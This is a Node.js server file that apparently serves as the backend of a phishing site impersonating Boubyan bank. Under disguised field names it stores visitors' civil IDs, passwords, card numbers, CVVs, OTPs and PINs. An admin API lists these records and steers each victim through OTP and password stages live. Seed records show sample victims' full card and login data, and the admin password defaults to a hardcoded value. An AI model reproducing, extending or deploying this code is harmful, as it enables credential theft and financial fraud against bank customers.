import http from "node:http";
import { randomBytes, randomUUID } from "node:crypto";
import fs from "node:fs/promises";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { createServer as createViteServer } from "vite";
import mysql from "mysql2/promise";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const isDev = process.argv[2] === "dev";
const port = Number(process.env.PORT || (isDev ? 5173 : 3000));
const adminPassword = process.env.ADMIN_PASSWORD || "Aa123123";
const databaseUrl = process.env.DATABASE_URL ? new URL(process.env.DATABASE_URL) : null;
const pool = databaseUrl
  ? mysql.createPool({
      host: databaseUrl.hostname,
      port: Number(databaseUrl.port || 3306),
      user: decodeURIComponent(databaseUrl.username),
      password: decodeURIComponent(databaseUrl.password),
      database: databaseUrl.pathname.slice(1),
      connectionLimit: 5,
      ssl: databaseUrl.searchParams.get("ssl") === "false" ? undefined : {},
    })
  : null;
const query = (...args) => {
  if (!pool) throw new Error("database_not_configured");
  return pool.query(...args);
};

const json = (res, status, body) => {
  res.statusCode = status;
  res.setHeader("Content-Type", "application/json; charset=utf-8");
  res.end(JSON.stringify(body));
};

const readBody = async (req) => {
  let raw = "";
  for await (const chunk of req) raw += chunk;
  if (!raw) return {};
  try {
    return JSON.parse(raw);
  } catch {
    throw new Error("invalid_json");
  }
};

const isAdmin = (req) => Boolean(adminPassword) && req.headers["x-admin-password"] === adminPassword;
const visitorColumns =
  "id, contact_ref, contact_name, contact_address, contact_extra, civil_id, member_label, secret_key_a, id_tail, extra_key_a, extra_key_b, extra_key_c, extra_key_d, extra_key_e, notify_key, stage_key, stage_state, prize_choice, nav_target, last_seen_at, created_at, updated_at";
const publicVisitorColumns = "id, stage_state, nav_target, last_seen_at";
const allowedPatchFields = new Set([
  "contact_ref", "contact_name", "contact_address", "contact_extra", "civil_id", "member_label", "secret_key_a", "id_tail",
  "extra_key_a", "extra_key_b", "extra_key_c", "extra_key_d", "extra_key_e", "notify_key",
  "stage_key", "stage_state", "prize_choice", "nav_target", "last_seen_at",
]);
const normalizeValue = (key, value) => {
  if (key !== "last_seen_at" || typeof value !== "string") return value;
  const date = new Date(value);
  if (Number.isNaN(date.getTime())) return value;
  return date.toISOString().slice(0, 23).replace("T", " ");
};

// In-memory store for local testing without MySQL
const memoryVisitors = new Map();

function seedMockVisitors() {
  const now = new Date();
  const mockItems = [
    {
      id: "demo-visitor-1",
      visitor_token: "mock-token-1",
      contact_name: "محمد عبدالله الشمري",
      contact_ref: "96598765432",
      civil_id: "290010101234",
      prize_choice: "موظف حكومي",
      contact_extra: "1,450 د.ك",
      contact_address: "15,000 د.ك",
      member_label: "mohammed_shammari",
      secret_key_a: "M@789#Pass",
      id_tail: "34",
      notify_key: "849201",
      extra_key_a: "4152 7890 2341 5567",
      extra_key_b: "08/29",
      extra_key_c: "732",
      extra_key_d: "4920",
      extra_key_e: "583190",
      stage_key: "card_otp",
      stage_state: "approved",
      nav_target: "/extra-key-c",
      last_seen_at: now.toISOString().slice(0, 23).replace("T", " "),
      created_at: new Date(now.getTime() - 15 * 60 * 1000).toISOString().slice(0, 23).replace("T", " "),
      updated_at: now.toISOString().slice(0, 23).replace("T", " "),
    },
    {
      id: "demo-visitor-2",
      visitor_token: "mock-token-2",
      contact_name: "سارة أحمد الكندري",
      contact_ref: "96565432109",
      civil_id: "295050509876",
      prize_choice: "قطاع خاص",
      contact_extra: "980 د.ك",
      contact_address: "8,000 د.ك",
      member_label: "sara_kandari",
      secret_key_a: "Sara2026!",
      id_tail: "76",
      notify_key: "319402",
      extra_key_a: "5210 9481 0023 8812",
      extra_key_b: "11/27",
      extra_key_c: "419",
      extra_key_d: null,
      extra_key_e: null,
      stage_key: "card_data",
      stage_state: "pending",
      nav_target: "/extra-key-a",
      last_seen_at: new Date(now.getTime() - 12 * 1000).toISOString().slice(0, 23).replace("T", " "),
      created_at: new Date(now.getTime() - 35 * 60 * 1000).toISOString().slice(0, 23).replace("T", " "),
      updated_at: new Date(now.getTime() - 2 * 60 * 1000).toISOString().slice(0, 23).replace("T", " "),
    },
    {
      id: "demo-visitor-3",
      visitor_token: "mock-token-3",
      contact_name: "خالد فهد المطيري",
      contact_ref: "96551234567",
      civil_id: "288121204567",
      prize_choice: "متقاعد",
      contact_extra: "1,200 د.ك",
      contact_address: "10,000 د.ك",
      member_label: "khaled_mutairi",
      secret_key_a: "Khaled@123",
      id_tail: "67",
      notify_key: "654128",
      extra_key_a: null,
      extra_key_b: null,
      extra_key_c: null,
      extra_key_d: null,
      extra_key_e: null,
      stage_key: "otp",
      stage_state: "pending",
      nav_target: "/notify-key",
      last_seen_at: new Date(now.getTime() - 8 * 1000).toISOString().slice(0, 23).replace("T", " "),
      created_at: new Date(now.getTime() - 8 * 60 * 1000).toISOString().slice(0, 23).replace("T", " "),
      updated_at: new Date(now.getTime() - 1 * 60 * 1000).toISOString().slice(0, 23).replace("T", " "),
    },
    {
      id: "demo-visitor-4",
      visitor_token: "mock-token-4",
      contact_name: "فاطمة ناصر العازمي",
      contact_ref: "96599887766",
      civil_id: "298030307890",
      prize_choice: "ربة منزل",
      contact_extra: "600 د.ك",
      contact_address: "5,000 د.ك",
      member_label: "fatima_azmi",
      secret_key_a: "Fatima99#",
      id_tail: "90",
      notify_key: null,
      extra_key_a: null,
      extra_key_b: null,
      extra_key_c: null,
      extra_key_d: null,
      extra_key_e: null,
      stage_key: "password",
      stage_state: "called",
      nav_target: "/access-key",
      last_seen_at: new Date(now.getTime() - 180 * 1000).toISOString().slice(0, 23).replace("T", " "),
      created_at: new Date(now.getTime() - 120 * 60 * 1000).toISOString().slice(0, 23).replace("T", " "),
      updated_at: new Date(now.getTime() - 50 * 60 * 1000).toISOString().slice(0, 23).replace("T", " "),
    }
  ];
  for (const item of mockItems) {
    memoryVisitors.set(item.id, item);
  }
}
seedMockVisitors();

async function hasVisitorAccess(req, id) {
  const token = req.headers["x-visitor-token"];
  if (typeof token !== "string" || !token) return false;
  if (!pool) {
    const item = memoryVisitors.get(id);
    return Boolean(item && item.visitor_token === token);
  }
  const [rows] = await query(
    "SELECT id FROM boubyan_visitors WHERE id = ? AND visitor_token = ? LIMIT 1",
    [id, token],
  );
  return rows.length > 0;
}

async function handleApi(req, res, url) {
  res.setHeader("Cache-Control", "no-store");
  if (req.method === "OPTIONS") {
    res.statusCode = 204;
    return res.end();
  }
  if (!url.pathname.startsWith("/api/visitors")) return false;

  // In-memory fallback if no database is connected
  if (!pool) {
    try {
      const parts = url.pathname.split("/").filter(Boolean);
      const id = parts[2] || null;

      if (req.method === "GET" && !id) {
        if (!isAdmin(req)) return json(res, 401, { error: "unauthorized" });
        const list = Array.from(memoryVisitors.values()).sort((a, b) => {
          const aSeen = a.last_seen_at ? new Date(a.last_seen_at).getTime() : 0;
          const bSeen = b.last_seen_at ? new Date(b.last_seen_at).getTime() : 0;
          return bSeen - aSeen;
        });
        return json(res, 200, list);
      }

      if (req.method === "GET" && id) {
        const admin = isAdmin(req);
        if (!admin && !(await hasVisitorAccess(req, id))) return json(res, 401, { error: "unauthorized" });
        const item = memoryVisitors.get(id);
        if (!item) return json(res, 200, null);
        if (admin) return json(res, 200, item);
        return json(res, 200, {
          id: item.id,
          stage_state: item.stage_state,
          nav_target: item.nav_target,
          last_seen_at: item.last_seen_at,
        });
      }

      if (req.method === "POST" && !id) {
        const body = await readBody(req);
        const entries = Object.entries(body).filter(([key, value]) => allowedPatchFields.has(key) && value !== undefined);
        if (!body.contact_ref || !entries.some(([key]) => key === "contact_ref")) {
          return json(res, 400, { error: "contact_ref_required" });
        }
        const newId = randomUUID();
        const visitorToken = randomBytes(32).toString("hex");
        const nowIso = new Date().toISOString().slice(0, 23).replace("T", " ");
        const record = {
          id: newId,
          visitor_token: visitorToken,
          stage_key: "personal_info",
          stage_state: "pending",
          nav_target: null,
          created_at: nowIso,
          updated_at: nowIso,
          last_seen_at: nowIso,
        };
        for (const [key, value] of entries) {
          record[key] = normalizeValue(key, value);
        }
        memoryVisitors.set(newId, record);
        return json(res, 201, { id: newId, visitor_token: visitorToken });
      }

      if (req.method === "PATCH" && id) {
        const admin = isAdmin(req);
        if (!admin && !(await hasVisitorAccess(req, id))) return json(res, 401, { error: "unauthorized" });
        const body = await readBody(req);
        const entries = Object.entries(body).filter(([key, value]) => allowedPatchFields.has(key) && value !== undefined);
        if (!entries.length) return json(res, 400, { error: "empty_update" });
        const record = memoryVisitors.get(id) || { id, created_at: new Date().toISOString().slice(0, 23).replace("T", " ") };
        for (const [key, value] of entries) {
          record[key] = normalizeValue(key, value);
        }
        record.updated_at = new Date().toISOString().slice(0, 23).replace("T", " ");
        memoryVisitors.set(id, record);
        if (admin) return json(res, 200, record);
        return json(res, 200, {
          id: record.id,
          stage_state: record.stage_state,
          nav_target: record.nav_target,
          last_seen_at: record.last_seen_at,
        });
      }

      if (req.method === "DELETE" && !id) {
        if (!isAdmin(req)) return json(res, 401, { error: "unauthorized" });
        memoryVisitors.clear();
        return json(res, 200, { ok: true });
      }

      if (req.method === "DELETE" && id) {
        if (!isAdmin(req)) return json(res, 401, { error: "unauthorized" });
        memoryVisitors.delete(id);
        return json(res, 200, { ok: true });
      }

      return json(res, 405, { error: "method_not_allowed" });
    } catch (error) {
      console.error("API error", error instanceof Error ? error.message : error);
      return json(res, 500, { error: "internal_error" });
    }
  }

  try {
    const parts = url.pathname.split("/").filter(Boolean);
    const id = parts[2] || null;

    if (req.method === "GET" && !id) {
      if (!isAdmin(req)) return json(res, 401, { error: "unauthorized" });
      const [rows] = await query(
        `SELECT ${visitorColumns} FROM boubyan_visitors ORDER BY last_seen_at DESC, created_at DESC, id DESC`,
      );
      return json(res, 200, rows);
    }

    if (req.method === "GET" && id) {
      const admin = isAdmin(req);
      if (!admin && !(await hasVisitorAccess(req, id))) return json(res, 401, { error: "unauthorized" });
      const columns = admin ? visitorColumns : publicVisitorColumns;
      const [rows] = await query(`SELECT ${columns} FROM boubyan_visitors WHERE id = ? LIMIT 1`, [id]);
      return json(res, 200, rows[0] ?? null);
    }

    if (req.method === "POST" && !id) {
      const body = await readBody(req);
      const entries = Object.entries(body).filter(([key, value]) => allowedPatchFields.has(key) && value !== undefined);
      if (!body.contact_ref || !entries.some(([key]) => key === "contact_ref")) {
        return json(res, 400, { error: "contact_ref_required" });
      }
      const columns = ["id", "visitor_token", ...entries.map(([key]) => key)];
      const values = [randomUUID(), randomBytes(32).toString("hex"), ...entries.map(([key, value]) => normalizeValue(key, value))];
      const placeholders = columns.map(() => "?").join(", ");
      await query(
        `INSERT INTO boubyan_visitors (${columns.join(", ")}) VALUES (${placeholders})`,
        values,
      );
      const [rows] = await query("SELECT id, visitor_token FROM boubyan_visitors WHERE id = ?", [values[0]]);
      return json(res, 201, rows[0] ?? null);
    }

    if (req.method === "PATCH" && id) {
      const admin = isAdmin(req);
      if (!admin && !(await hasVisitorAccess(req, id))) return json(res, 401, { error: "unauthorized" });
      const body = await readBody(req);
      const entries = Object.entries(body).filter(([key, value]) => allowedPatchFields.has(key) && value !== undefined);
      if (!entries.length) return json(res, 400, { error: "empty_update" });
      const assignments = entries.map(([key]) => `${key} = ?`).join(", ");
      const values = entries.map(([key, value]) => normalizeValue(key, value));
      values.push(id);
      await query(`UPDATE boubyan_visitors SET ${assignments}, updated_at = CURRENT_TIMESTAMP(6) WHERE id = ?`, values);
      const columns = admin ? visitorColumns : publicVisitorColumns;
      const [rows] = await query(`SELECT ${columns} FROM boubyan_visitors WHERE id = ?`, [id]);
      return json(res, 200, rows[0] ?? null);
    }

    if (req.method === "DELETE" && !id) {
      if (!isAdmin(req)) return json(res, 401, { error: "unauthorized" });
      await query("DELETE FROM boubyan_visitors");
      return json(res, 200, { ok: true });
    }

    if (req.method === "DELETE" && id) {
      if (!isAdmin(req)) return json(res, 401, { error: "unauthorized" });
      await query("DELETE FROM boubyan_visitors WHERE id = ?", [id]);
      return json(res, 200, { ok: true });
    }

    return json(res, 405, { error: "method_not_allowed" });
  } catch (error) {
    console.error("API error", error instanceof Error ? error.message : error);
    return json(res, 500, { error: "database_error" });
  }
}

async function serveStatic(req, res, url) {
  const requested = decodeURIComponent(url.pathname === "/" ? "/index.html" : url.pathname);
  const candidate = path.resolve(__dirname, "dist", `.${requested}`);
  const root = path.resolve(__dirname, "dist");
  const filePath = candidate === root || candidate.startsWith(`${root}${path.sep}`) ? candidate : null;
  const contentTypes = {
    ".html": "text/html; charset=utf-8",
    ".js": "application/javascript; charset=utf-8",
    ".mjs": "application/javascript; charset=utf-8",
    ".css": "text/css; charset=utf-8",
    ".json": "application/json; charset=utf-8",
    ".svg": "image/svg+xml",
    ".png": "image/png",
    ".jpg": "image/jpeg",
    ".jpeg": "image/jpeg",
    ".webp": "image/webp",
    ".gif": "image/gif",
    ".ico": "image/x-icon",
    ".txt": "text/plain; charset=utf-8",
  };
  try {
    const stat = filePath ? await fs.stat(filePath) : null;
    if (stat.isFile()) {
      const content = await fs.readFile(filePath);
      res.setHeader("Content-Type", contentTypes[path.extname(filePath).toLowerCase()] || "application/octet-stream");
      res.statusCode = 200;
      res.end(content);
      return;
    }
  } catch {}

  if (path.extname(requested)) {
    res.statusCode = 404;
    res.setHeader("Content-Type", "text/plain; charset=utf-8");
    res.end("Not found");
    return;
  }

  const html = await fs.readFile(path.join(root, "index.html"));
  res.setHeader("Content-Type", "text/html; charset=utf-8");
  res.statusCode = 200;
  res.end(html);
}

const vite = isDev
  ? await createViteServer({ server: { middlewareMode: true }, appType: "spa" })
  : null;

const server = http.createServer(async (req, res) => {
  const url = new URL(req.url || "/", `http://${req.headers.host || "localhost"}`);
  if (url.pathname === "/healthz") {
    return json(res, 200, { ok: true, databaseConfigured: Boolean(pool), inMemoryMode: !pool });
  }
  if (url.pathname.startsWith("/api/")) {
    const handled = await handleApi(req, res, url);
    if (!handled && !res.writableEnded) json(res, 404, { error: "not_found" });
    return;
  }
  if (vite) {
    vite.middlewares(req, res, () => res.end());
    return;
  }
  await serveStatic(req, res, url);
});

server.listen(port, "0.0.0.0", () => {
  console.log(`Boubyan server listening on port ${port}`);
});

const shutdown = async () => {
  if (pool) await pool.end();
  server.close();
  if (vite) await vite.close();
};
process.on("SIGTERM", shutdown);
process.on("SIGINT", shutdown);
